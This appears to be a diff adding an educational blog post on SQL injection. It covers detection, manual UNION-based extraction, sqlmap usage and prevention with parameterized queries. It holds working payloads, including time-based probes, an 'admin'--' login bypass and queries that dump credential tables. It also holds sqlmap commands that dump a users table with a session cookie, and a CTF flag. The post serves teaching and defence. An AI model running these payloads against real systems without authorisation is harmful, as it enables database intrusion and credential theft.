@@ -1,0 +1,139 @@
+---
+title: "SQL Injection: From Detection to Extraction"
+description: "A hands-on walkthrough of SQL injection — detection techniques, manual exploitation, and automated extraction with sqlmap."
+date: 2025-01-18
+tags: ["web", "pentest", "ctf"]
+---
+
+import Callout from '../../components/Callout.astro';
+import Flag from '../../components/Flag.astro';
+
+## What is SQL Injection?
+
+SQL injection (SQLi) occurs when user-supplied input is interpolated directly into a SQL query without sanitization. The attacker can terminate the intended query and append their own.
+
+```sql
+-- Intended query:
+SELECT * FROM users WHERE username = 'alice' AND password = 'secret';
+
+-- Injected input: username = admin'--
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
+--                                           ^^ comment: rest is ignored
+```
+
+## Detection
+
+### Error-Based
+
+```
+' → syntax error? → likely injectable
+'' → no error? → input is being escaped
+```
+
+### Boolean-Based (Blind)
+
+```sql
+' AND 1=1--   → same response as normal → TRUE condition works
+' AND 1=2--   → different/empty response → FALSE confirmed
+```
+
+### Time-Based (Blind)
+
+```sql
+-- MySQL
+' AND SLEEP(5)--
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+'; SELECT pg_sleep(5)--
+```
+
+If the response takes ~5 seconds longer, the injection point is confirmed even with no visible output.
+
+## Manual Exploitation
+
+### Determine Column Count
+
+```sql
+' ORDER BY 1--   ✓
+' ORDER BY 2--   ✓
+' ORDER BY 3--   ✓
+' ORDER BY 4--   ✗  → 3 columns
+```
+
+### UNION-Based Extraction
+
+```sql
+-- Find which columns are reflected
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 'a',NULL,NULL--   → if 'a' appears, col 1 is string
+
+-- Extract database version
+' UNION SELECT version(),NULL,NULL--
+
+-- List tables (MySQL)
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- Dump credentials
+' UNION SELECT username,password,NULL FROM users--
+```
+
+<Callout type="tip" title="Useful Payloads Reference">
+Always try comment styles for the target DBMS:
+- MySQL: `--`, `#`, `/**/`
+- MSSQL: `--`, `/**/`
+- Oracle: `--`
+- PostgreSQL: `--`, `/**/`
+</Callout>
+
+## Automated: sqlmap
+
+```bash
+# Basic scan
+sqlmap -u "http://target.com/item?id=1" --dbs
+
+# Specify database and dump tables
+sqlmap -u "http://target.com/item?id=1" -D shop --tables
+
+# Dump specific table
+sqlmap -u "http://target.com/item?id=1" -D shop -T users --dump
+
+# POST request
+sqlmap -u "http://target.com/login" \
+  --data="username=admin&password=test" \
+  --level=3 --risk=2
+
+# With cookies (authenticated scan)
+sqlmap -u "http://target.com/profile?id=1" \
+  --cookie="session=abc123" \
+  --dbs
+```
+
+<Callout type="warning">
+Only use sqlmap against systems you own or have explicit written permission to test. Unauthorized use is illegal.
+</Callout>
+
+## CTF Example
+
+Given a login form at `/login`, testing `admin'--` as the username bypasses authentication entirely and reveals the flag in the dashboard:
+
+<Flag value="CTF{sql1_1nj3ct10n_m4st3r}" />
+
+## Prevention
+
+```python
+# WRONG — string interpolation
+query = f"SELECT * FROM users WHERE username = '{username}'"
+
+# RIGHT — parameterized queries (Python + psycopg2)
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+# RIGHT — ORM (SQLAlchemy)
+user = session.query(User).filter_by(username=username).first()
+```
+
+<Callout type="success" title="Key Takeaway">
+Parameterized queries / prepared statements completely eliminate SQL injection. Input validation and WAFs are defense-in-depth, not substitutes.
+</Callout>
